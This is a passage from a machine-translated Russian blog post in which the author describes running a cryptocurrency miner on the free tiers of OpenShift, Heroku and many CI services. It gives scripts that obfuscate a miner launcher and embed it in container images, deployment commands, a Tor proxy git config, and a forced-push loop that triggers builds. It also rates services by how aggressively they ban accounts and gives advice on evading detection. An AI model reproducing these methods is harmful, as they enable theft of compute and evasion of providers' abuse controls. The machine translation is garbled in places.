    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Этот сценарий использовался для создания контейнера для майнинга, для которого требовался шаблон yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Но весь процесс включал в себя довольно много шагов!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>В псевдокоде:<ul><li><p>создать проект<li><p>создать приложение без изображения<li><p>построить контейнер для майнинга<li><p>развернуть контейнер с конфигурацией развертывания (абстракция kubernetes)<li><p>развернуть развертывание<ul><p>В<code>build-build</code> сценарии вместо этого создали<em> строить</em> контейнер, который будет добывать по несколько часов за раз. Сборки и обычные поды имеют отдельные ресурсы в openshift, поэтому мы использовали их оба. Openshift был в целом плохим опытом, поскольку он прошел более 4 разных выпусков (может быть, больше, я перестал отслеживать через некоторое время), и каждый из них требовал изменений в конфигурациях, у них не было путей обновления, и все быстро повторялось, и это было обычным явлением. для сборок / подов, которые останавливались и не собирались мусором ... они обычно запускали ручной перезапуск время от времени, может быть, кубернетес просто глючил :)<p>Конфигурация Heroku была немного проще (без кубернетов). Помимо сборки контейнера, которая была похожа на сборку openshift, остальное было всего двумя командами cli<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Контейнер был напрямую перенесен с помощью docker в реестр heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Трения с heroku (уровень бесплатного пользования все еще актуален на момент написания) заключается в том, что динамометрические станции могут работать только 22 дня в месяц, поэтому они требовали некоторого ручного управления каждый месяц, что опять же неудобно и скучно. Вначале они провели несколько волн банов, а затем отключили регистрацию через TOR, я совершенно уверен, что я был причиной этого.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Контейнеры или виртуальные машины CI</a></h3><p>Это были самые синергетические цели для нашего капельницы. Здесь очень много<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> компании, многие из которых сжигают деньги инвесторов, предлагая бесплатные уровни в надежде получить некоторую долю рынка в бизнесе технологической инфраструктуры.<p>Все эти службы предлагают разные ресурсы, имеют разные требования к конфигурации и работают в разных средах. Я никогда не рассматривал автоматическую регистрацию учетной записи, потому что такие вещи ужасно программировать, я стараюсь избегать их все время, поэтому я просто терпел ручную регистрацию какое-то время, так как мне было любопытно, какой ответ от спама я получу (и как отличается от остальных!). Вы можете догадаться о некоторых вещах об управлении компанией по тому, как она обрабатывает спам:<ul><li><p>Выполняет ли он волны банов? Тогда у них не строгие правила, проблемы решаются вручную и в каждом конкретном случае.<li><p>Требуется ли проверка телефона? Они уже подвергались насилию в прошлом<li><p>Отвечают ли они на интенсивное использование ресурсов? У них ограниченный бюджет<li><p>Применяют ли они ограничения учетной записи или теневые запреты? Если они теневой бан, у них есть злые системные администраторы.<ul><p>Существует также философский вопрос: если сервис позволяет вам злоупотреблять своей системой в течение длительного времени, означает ли это, что у них есть первоклассная инфраструктура, способная справиться с нагрузкой, или просто плохой контроль над своей системой? И вы должны учитывать баланс между доступностью и безопасностью: слишком безопасная система может снизить удержание пользователей.<p>Вот таблица, показывающая некоторые службы, в которых я развернул:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>конфигурация<th style=text-align:center>представление<th style=text-align:center>молоток<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>плохой<td style=color:#ff0;text-align:center>Средняя<td style=color:#ff0;text-align:center>Средняя<tr><td style=text-align:center>Трэвис<td style=color:green;text-align:center>хороший<td style=color:#ff0;text-align:center>Средняя<td style=color:green;text-align:center>хороший<tr><td style=text-align:center>Кодирование<td style=color:#ff0;text-align:center>Средняя<td style=color:red;text-align:center>плохой<td style=color:#ff0;text-align:center>Средняя<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>Средняя<td style=color:green;text-align:center>хороший<td style=color:green;text-align:center>хороший<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>плохой<td style=color:green;text-align:center>хороший<td style=color:#ff0;text-align:center>Средняя<tr><td style=text-align:center>Семафор<td style=color:green;text-align:center>хороший<td style=color:green;text-align:center>хороший<td style=color:#ff0;text-align:center>Средняя<tr><td style=text-align:center>Докер<td style=color:#ff0;text-align:center>Средняя<td style=color:#ff0;text-align:center>Средняя<td style=color:green;text-align:center>хороший<tr><td style=text-align:center>Набережная<td style=color:green;text-align:center>хороший<td style=color:#ff0;text-align:center>Средняя<td style=color:#ff0;text-align:center>Средняя<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>плохой<td style=color:green;text-align:center>хороший<td style=color:#ff0;text-align:center>Средняя<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>Средняя<td style=color:#ff0;text-align:center>Средняя<td style=color:red;text-align:center>плохой<tr><td style=text-align:center>Лазурные трубопроводы<td style=color:#ff0;text-align:center>Средняя<td style=color:#ff0;text-align:center>Средняя<td style=color:red;text-align:center>плохой<tr><td style=text-align:center>Непрерывный<td style=color:red;text-align:center>плохой<td style=color:#ff0;text-align:center>Средняя<td style=color:#ff0;text-align:center>Средняя<tr><td style=text-align:center>приятель<td style=color:red;text-align:center>плохой<td style=color:red;text-align:center>плохой<td style=color:red;text-align:center>плохой<tr><td style=text-align:center>Дрон<td style=color:red;text-align:center>плохой<td style=color:green;text-align:center>хороший<td style=color:red;text-align:center>плохой<tr><td style=text-align:center>Appveyor<td style=color:red;text-align:center>плохой<td style=color:#ff0;text-align:center>Средняя<td style=color:red;text-align:center>плохой<tr><td style=text-align:center>Nevercode<td style=color:red;text-align:center>плохой<td style=color:green;text-align:center>хороший<td style=color:#ff0;text-align:center>Средняя<tr><td style=text-align:center>Zeist / Vercel<td style=color:red;text-align:center>плохой<td style=color:green;text-align:center>хороший<td style=color:red;text-align:center>плохой<table><p>В этом контексте<span style=color:green> хороший</span> конфигурация означает, что настройка<code>ci</code> работа для процесса майнинга (как и все сервисы, полагающиеся на веб-панель управления вместо точечного файла репозитория, были рутиной),<span style=color:red> плохой</span><code>ban-hammer</code> означает, что было сложно зарегистрироваться в сервисе, или что аккаунты будут заблокированы более агрессивно.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> требуется для настройки проекта, для определения среды, целевой архитектуры, процесса выполнения и прочего, настройка сборки занимала очень много времени, поэтому она получила плохую оценку в конфигурации.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Непрерывный</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> приятель</a> , [Codefresh] также требует выполнения множества ручных недекларативных шагов настройки.<p>Такие службы, как [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> приятель</a> применяет теневые запреты к учетным записям, теневые запреты - это плохо, так как они заставляют вас гадать, что-то не так с вашей конфигурацией или нет. С некоторыми сервисами вы можете угадать причину запрета (в значительной степени ваша сборка заняла слишком много времени или вы построили слишком много раз за короткий период), для некоторых других, таких как [Azure-pipelines], я предполагаю, что они применили какой-то отпечаток пальца в пользовательские репозитории, поскольку баны проходили даже без злоупотребления ресурсами, лазурь и версия также ограничивались<code>DNS</code> доступ в пределах общедоступных строительных машин, так что это было дополнительное трение, которое необходимо было преодолеть с помощью специального туннеля.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Дрон</a> предоставил доступ ко всему процессору с 16+ ядрами, но в итоге был заблокирован после 2 сборок<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Кодирование</a> также предоставляет доступ к мощным хостам сборки и не банит так же агрессивно, как дрон.<p>Мои любимые сервисы не из-за прибыльности, а из-за простоты и удобства (в том числе и с другими проектами) были<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Трэвис</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Семафор</a> а также<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Докер-хаб</a> . Travis похож на стандартный CI и очень гибкий, Semaphore - единственный<code>DSL</code> для<code>CI</code> это выглядело доступным и хорошо, хотя вместо бесконечной последовательности спагеттифицированных флажков, как другие пользовательские интерфейсы, и Docker просто для простоты сопоставления файлов докеров со сборками.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Конфиги сборок</a></h3><p>Сборки запускались либо заданиями cron, предлагаемыми веб-сервисами, либо коммитами git. Таким образом, вам нужно было отслеживать засорение токенов доступа или ключей ssh, чтобы управлять всеми коммитами git. Также было важно не спамить излишне коммитов и использовать прокси при отправке в репозитории с настройкой git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Используя службы хостинга git, github был одним из наиболее тщательных в отношении запретов, но они выполнялись только после сообщений о злоупотреблениях со стороны администраторов служб ci, gitlab выполнил волну запрета один раз, когда я попытался продлить пробную версию CI (небрежно). Я никогда не получал бан для учетной записи Bitbucket. Чтобы (принудительно) нажать git коммиты, у нас есть длительный цикл, который повторно помечает репозиторий git:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Вполне возможно, что принудительное продвижение таким образом не очень нравится github и могло быть причиной пометки учетных записей. Функция tagger, которой поручено принудительно подталкивать разные коммиты, использует веб-сайт (который вы можете легко найти), который дает некоторые рандомизированные коммиты. Я не уверен, насколько это помогает, поскольку само содержание коммитов явно подозрительно для моего случая. И это также однажды укусило меня за задницу, так как коммиты, возвращаемые этой командой, могут включать нецензурные слова, одна из моих коммитов была подхвачена ботом twitter, который отслеживает коммиты git с нецензурными словами! Я добавил черный список плохих слов после инцидента.<p>Я не особо углублялся в запутанные коммиты git и запутанные репозитории git. Единственный случай, когда я использовал более сложный репозиторий, был с Bitrise, поскольку вы не могли настроить сборку, если система не распознала среду (например, мобильные приложения), но даже тогда ротации не было, и она всегда была одинаковой. репозиторий, довольно легко обнаружить.<p>В целом, если бы мне пришлось построить колоколообразную кривую вокруг оптимального времени для добычи<em> без</em>Забанить учетные записи для всех протестированных сервисов можно было бы в центре с продолжительностью сборки около 1 часа один раз в день. Для ядер ЦП, за исключением пары сторонних лиц (например, дронов), большинство сервисов ожидают, что вы используете весь объем предоставленных вам ресурсов, поскольку сборки выполняются внутри виртуальных машин или контейнеров с ограниченными ресурсами ... а компиляция обычно является задачей, которая насыщает процессор, поэтому он не имеет статистической значимости. Интуитивно понятно, что одна сборка в день - это то, что делал бы средний разработчик, поэтому вы должны ожидать поднятых флагов, если вы отклонитесь от среднего, а настаивание на злоупотреблениях никогда не заканчивается хорошо.<h2 id=conclusions><a class=header-anchor href=#conclusions> Выводы</a></h2><p>Стоило ли? Сетевые части были определенно интересными, регистрация учетных записей была явно худшей частью, в конце концов, никто не любит щелкать бесконечные письма с подтверждением и повторять процедуры пользовательского интерфейса, ошеломляющие разум. Писать программное обеспечение для автоматизации спама тоже скучно (потому что вы в основном копаетесь в глупых API), и с этим предположением (и тем фактом, что это никогда не было чем-то серьезным) я даже не думал об этом. Было ли это выгодно? На пике он достигал чего-то вроде<code>300$</code> в месяц, может хватит венесуэльцу, не совсем мне :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> сварливый сисадмин</em><table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>хотя это нарушило бы многие предположения о конфиденциальности, я уверен, что большинство из них просто заглядывают внутрь всякий раз, когда возникает актуальная проблема, но это проблема только для сред выполнения на основе контейнеров, тогда как виртуальные машины в значительной степени являются черными ящиками.<table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>майнер, встроенный в узел monero, получил некоторую работу, чтобы сделать его более дружественным к фону, но распространение xmrig никогда не было ориентировано на дружелюбие к фону.<table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>некоторые пулы предлагают разные трудности на разных портах подключения и, как правило, выравнивают сложность задания в соответствии с предоставленными майнером общими ресурсами, но детализация прокси-сервера все же была более удобной, так как это предотвратило бы пул<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> запирание</a> (хотя мы никогда толком не меняли пулы).<table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>он не был счастлив, когда конфиг внезапно появился и исчез из файловой системы<table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Мы не говорим о<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> протокол слоя</a> поскольку нам просто нужно иметь дело с тем, что реализовано в<em> оба</em> пул и майнер ... который обычно является минимальным и, возможно, с нестандартными расширениями.<table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>никогда не ходи на полную :)<table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Я не исследовал, что происходит, когда процесс загружает дополнительные функции во время выполнения, поскольку ядро ​​будет искать адрес в структуре памяти исполняемого файла, который будет обращаться к файловой системе и, возможно, вызывает сбой.<table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Пределы произвольные, время ЦП меньше секунды, память меньше 128М, исходящие соединения блокируются.<table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>проявив немного терпения, вы также можете запустить полный экземпляр ssh в среде, загруженной вокруг вашей учетной записи cpanel,<em> без</em> иметь доступ к встроенному SSH cpanel, который обычно отключается хостинг-провайдерами.<table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift перешел с 1 года бесплатного пользования на 3 месяца до 1 месяца, начиная с требования аутентификации по телефону, я могу гарантировать, что я был не единственным, кто злоупотреблял их услугами.<table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Контейнеры уровня бесплатного доступа Heroku довольно щедры по ресурсам, они предоставляют 4c / 8t (виртуальные) процессоры, много оперативной памяти и большое хранилище (которое, однако, не является постоянным и отбрасывается при выключении дино).<table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Они добавляют намного более строгие правила регистрации, после пары банов я, возможно, внес свой вклад в это.<table><p><div id=post-tags-list>Теги сообщений: <span class=post-tag><a href=https://www.unto.re/tag/crypto> крипто</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> сеть</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> оболочка</a></span></div><div class=page-foot><div class=copyright>21 августа 2021 г.</div></div><div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - При поддержке<a href=https://github.com/tlienart/Franklin.jl> Франклин</a></div><div class=page__footer-links>- <ul><li><a href=/ru/sitemapxml> Карта сайта</a></li> | <li><a href=/ru/tag> Теги</a></li> | <li><a href=/ru/feedxml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re><i class="fas fa-envelope"></i></a><li></ul></footer></div>